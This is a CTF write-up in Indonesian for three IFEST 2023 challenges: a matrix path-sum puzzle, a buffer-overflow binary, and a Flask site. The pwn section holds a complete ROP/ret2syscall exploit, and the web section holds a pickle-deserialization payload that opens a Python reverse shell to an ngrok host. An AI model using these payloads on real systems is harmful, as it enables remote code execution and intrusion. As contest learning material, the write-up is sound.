+++
title = "IFEST 2023"
date = 2023-09-10
draft = false
categories = ["CTF Writeups", "Not Translated"]
tags = ["ifest", "misc", "pwn", "web", "writeup"]
summary = "Writeup tim CP Enjoyer untuk challenge Misc (Berhitung), Pwn (Krei), dan Web (Secret Recipe Exchange) di IFEST 2023."
+++

Writeup dari tim **CP Enjoyer** untuk IFEST 2023 — hanya bagian **Misc** (Berhitung), **Pwn** (Krei), dan **Web** (Secret Recipe Exchange).

---

# Misc

## Berhitung (260 pts)

{{< admonition quote "Deskripsi" >}}
Berhitung tapi tidak semudah itu, bestie...

`nc 103.152.242.235 26693`

**Author:** cipichop

**Attachments:** `Berhitung.docx`
{{< /admonition >}}

### Analisis awal

Diberikan file `Berhitung.docx` yang berisi deskripsi soal seperti soal Competitive Programming. Service akan memberikan sebuah matriks berisi angka dan kita diminta mencari jalur dengan jumlah nilai terbesar, di mana setiap elemen hanya boleh berpindah ke tetangga (termasuk diagonal) yang nilainya tepat 1 lebih besar.

Kami menyelesaikan soal ini dengan melakukan looping pada setiap elemen dan menelusuri tetangganya yang memiliki nilai 1 lebih dari elemen tersebut. Penelusuran tetangga dilakukan sampai tidak terdapat tetangga yang memiliki nilai elemen ditambah 1. Jalur terpanjang disimpan pada variabel `highest`. Berikut adalah solver kami, namun tidak selalu berhasil (kurang tau kenapa).

### Mendapatkan flag

**solver.py**

```python
from pwn import *

r = remote('103.152.242.235', 26693)
context.log_level = 'debug'
r.recvuntil(b'...\n')

def check(i, j, a, b):
    global array, temp, current
    if array[i][j] + 1 == array[a][b]:
        check_neighbours(a, b)
        current -= array[a][b]
        temp -= 1

def check_neighbours(i, j):
    global array, most, temp, current, highest
    temp += 1
    current += array[i][j]
    if temp > most:
        most = temp
        highest = current
    if i > 0 and j > 0:
        check(i, j, i-1, j-1)
    if i > 0 and j < l-1:
        check(i, j, i-1, j+1)
    if i < p-1 and j > 0:
        check(i, j, i+1, j-1)
    if i < p-1 and j < l-1:
        check(i, j, i+1, j+1)
    if i > 0:
        check(i, j, i-1, j)
    if i < p-1:
        check(i, j, i+1, j)
    if j > 0:
        check(i, j, i, j-1)
    if j < l-1:
        check(i, j, i, j+1)

for _ in range(50):
    p = int(r.recvuntilS(b' ', True))
    l = int(r.recvlineS(False))
    array = [[] for _ in range(p)]
    for i in range(p):
        array[i] = [int(x) for x in r.recvlineS().rstrip().split(' ')]
    most = 0
    highest = 0
    temp = 0
    current = 0
    for i in range(p):
        for j in range(l):
            temp = 0
            current = 0
            check_neighbours(i, j)
    #print(most, highest)
    r.sendlineafter(b'menjawab = ', str(highest).encode())
r.interactive()
```

**Output**

```text
[DEBUG] Sent 0x5 bytes:
    b'8128\n'
[DEBUG] Received 0x78 bytes:
    b'Teru bangga dengan Chopi dan memberi hadiah sebagai berikut :)\n'
    b'IFEST23{if_CP_Enjoyer_exist_why_dont_CTF_Enjoyer_exist}\n'
    b'\n'
Traceback (most recent call last):
  File "/home/zran/Downloads/ifest2023/misc/berhitung/solver.py", line 40, in <module>
    p = int(r.recvuntilS(b' ', True))
ValueError: invalid literal for int() with base 10: 'Teru'
[*] Closed connection to 103.152.242.235 port 26693
```

> Flag: `IFEST23{if_CP_Enjoyer_exist_why_dont_CTF_Enjoyer_exist}`

---

# Pwn

## Krei (300 pts)

{{< admonition quote "Deskripsi" >}}
Kesalahan! Sistem terhambat.

`nc 103.152.242.235 5555`

**Author:** Vin

**Attachments:** `Krei`
{{< /admonition >}}

### Analisis awal

Diberikan suatu binary `Krei`.

{{< image src="krei-checksec.png" caption="Hasil checksec pada binary Krei" height=140 >}}

Terdapat buffer overflow pada fungsi `bot`.

```c
__int64 bot()
{
  char v1[128]; // [rsp+0h] [rbp-80h] BYREF

  if ( i != 1 )
  {
    puts("DDOS ATTACK detected, shutting down all services.");
    exit(0);
  }
  puts("Halo!, saya krei ada yang bisa saya bantu?");
  return __isoc99_scanf("%s", v1);
}
```

Fungsi `scanf` di atas tidak membatasi panjang input sehingga kita dapat melakukan buffer overflow untuk meng-overwrite RIP. Variabel `i` di atas adalah variabel global yang membuat kita tidak bisa return kembali ke `main` karena terdapat perintah `i++` pada fungsi `main`.

Biasanya, eksploit untuk buffer overflow yang tidak terbatas adalah ret2libc dengan alur leak alamat GOT menggunakan fungsi `puts` atau `printf` dan kemudian kembali ke fungsi `main` untuk menyusun ROP chain. Namun karena variabel `i` di atas, kita tidak bisa kembali ke `main` dan kami coba meng-overwrite RIP menjadi `exe.sym.bot+34`. Ini akan tetap memanggil `scanf`.

Perlu diingat, variabel lokal relatif terhadap RBP. Maka, kita tidak boleh mengisi RBP dengan padding sembarangan. Di sini, kami mengisinya dengan alamat `bss+0x100`. Iya, kita akan melakukan stack pivot untuk menyusun ROP chain. Kami awalnya mencoba `one_gadget` tapi tidak berhasil, dan kami akhirnya melakukan ret2syscall dengan gadget `pop rax` dan string `/bin/sh` dari libc.

### Mendapatkan shell

Sebelumnya, kami leak alamat `puts` dan `setbuf` untuk mendapatkan libc dari https://libc.rip dan mendapatkan `libc6-amd64_2.36-9+deb12u1_i386.so`. Berikut adalah script exploit kami.

**solve.py**

```python
#!/usr/bin/env python3
from pwn import *
import sys
import os
import random

exe = ELF("./Krei")
libc = ELF("./libc.so.6")
context.binary = exe
context.log_level = 'debug'

cmd = '''
set max-visualize-chunk-size 0x500
b *main
b *bot+56
b *bot+89
c
'''

def find_offset(size=100):
    global r
    temp = context.log_level
    context.log_level = 'CRITICAL'
    r.sendline(cyclic(size))
    r.wait()
    r.close()
    core = r.corefile
    context.log_level = 'INFO'
    log.success(f'Crashed at : %s' % p32(core.fault_addr & 0xffffff).decode())
    log.success(f'Offset      : %s' % cyclic_find(core.fault_addr & 0xffffff))
    context.log_level = temp
    os.remove(core.path)

def conn(cmd):
    global r
    global payload
    if 'i' in sys.argv:
        context.log_level = 'info'
    elif 'c' in sys.argv:
        context.log_level = 'critical'
    if '1' in sys.argv or 'local' in sys.argv:
        r = process([exe.path])
    elif '2' in sys.argv or 'server' in sys.argv:
        r = remote('103.152.242.235', 5555)
    else:
        if context.arch == 'i386' or context.arch == 'amd64':
            r = process([exe.path], aslr=False)
        else:
            port = str(random.randint(1000, 9999))
            cmd = 'file %s\ntarget remote localhost:%s' % (exe.path, port) + cmd
            if context.arch == 'arm' and context.endian == 'little':
                r = process(['qemu-arm-static', '-g', port, exe.path])
            elif context.arch == 'mips' and context.endian == 'little':
                r = process(['qemu-mipsel-static', '-g', port, exe.path])
    sleep(1)
    gdb.attach(r, cmd)

def main():
    global r
    global payload
    conn(cmd)
    rop = ROP(exe)
    ret = rop.find_gadget(['ret']).address
    payload = flat({0x80: exe.bss(0x100)}, rop.rdi.address, exe.got.puts, exe.sym.puts, ret, exe.sym.bot+34)
    r.sendlineafter(b'bantu?\n', payload)
    leak = u64(r.recvline().rstrip().ljust(8, b'\x00'))
    print(hex(leak))
    libc.address = leak - libc.sym.puts
    binsh = next(libc.search(b'/bin/sh\0'))
    pop_rax = next(libc.search(asm('pop rax; ret'), executable=True))
    payload = flat({136: rop.rdi.address}, binsh, rop.rsi.address, 0, rop.rdx.address, 0, pop_rax, 0x3b, rop.syscall.address)
    r.sendline(payload)
    context.log_level = 'debug'
    r.interactive()

if __name__ == '__main__':
    main()
```

Setelah menjalankan program tersebut, didapatkan shell dan flag.

{{< image src="krei-flag.png" caption="Berhasil mendapatkan shell dan membaca flag" height=350 >}}

> Flag: `IFEST23{h3y_yoU_4R3_NOT_suPPos3D_t0_sEE_tH1S_Bcrsze}`

---

# Web

## Secret Recipe Exchange (300 pts)

{{< admonition quote "Deskripsi" >}}
Carletye baru saja membuat sebuah website tentang memasak, dia menginginkan kita untuk mencoba melihat - lihat websitenya dan sekalian melakukan testing pada webnya. Bila menemukan sesuatu didalam websitenya, dia akan menghadiahimu makanan favoritnya dia, acar!

**author:** Mewzael

http://103.152.242.235:5000/

**Attachments:** `SecretRecipeExchange.zip`
{{< /admonition >}}

### Analisis awal

Diberikan suatu url web dan file `SecretRecipeExchange.zip` yang berisi source code dari web tersebut. Berikut adalah bagian dari `web.py`.

```python
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.cookies.get('session')
        if token is None:
            return redirect('/')
        user_obj = pickle.loads(b64decode(token))
        return f(user_obj, *args, **kwargs)
    return decorated
```

Pada potongan kode di atas, terlihat modul `pickle` digunakan. Modul `pickle` adalah modul Python untuk melakukan object serialization dan de-serialization. Dan pada kasus kali ini, token yang digunakan diambil dari cookie `session`. Ini dilakukan untuk membuat suatu objek `UserID` untuk setiap user yang mengunjungi website.

```python
class UserID():
    def __init__(self):
        self.uuid = str(uuid.uuid1())
        self.username = None

    def __str__(self):
        return self.uuid
```

Kami awalnya bingung kenapa atribut `username` selalu `None` dan tidak pernah diubah. Jadi kami mencoba untuk mengubah cookie `session` agar `username` berisi sesuatu tapi tidak terjadi apa-apa. Akhirnya kami mencari di Google tentang eksploitasi modul `pickle` ini dan kami mendapatkan writeup https://ctftime.org/writeup/36628. Jadi, kami mengikuti langkah-langkah pada writeup tersebut untuk mendapatkan reverse shell.

### Mendapatkan reverse shell

Kami menyiapkan listener `nc` pada port 4444 dan meneruskannya lewat tunnel `ngrok`.

{{< image src="secret-recipe-nc-listen.png" caption="Listener nc pada port 4444" height=40 >}}
{{< image src="secret-recipe-ngrok.png" caption="Tunnel ngrok menuju port 4444" height=280 >}}

**solve.py**

```python
#!/usr/bin/env python3
import pickle, os, base64
import requests

class RCE(object):
    def __reduce__(self):
        return (os.system,('''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io.",12378));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',))

def main():
    pickledPayload = base64.b64encode(pickle.dumps(RCE())).decode()
    print(f'[*] Payload: {pickledPayload}')
    URL = 'http://103.152.242.235:5000/home'
    cookie = {
        'session': pickledPayload
    }
    print('[*] Request result:')
    orderRequestResult = requests.get(URL, cookies=cookie)
    print(orderRequestResult.text)

if __name__ == '__main__':
    main()
```

Setelah payload dikirim sebagai cookie `session`, kami mendapatkan reverse shell dan membaca flag.

{{< image src="secret-recipe-solver.png" caption="Payload pickle yang dihasilkan solver" height=100 >}}
{{< image src="secret-recipe-flag.png" caption="Reverse shell dan flag" height=180 >}}

> Flag: `IFEST23{1M_P1Ckl3_R1ck_W1th_S0M3_C00kI3_S3R14L1ZAT10N}`
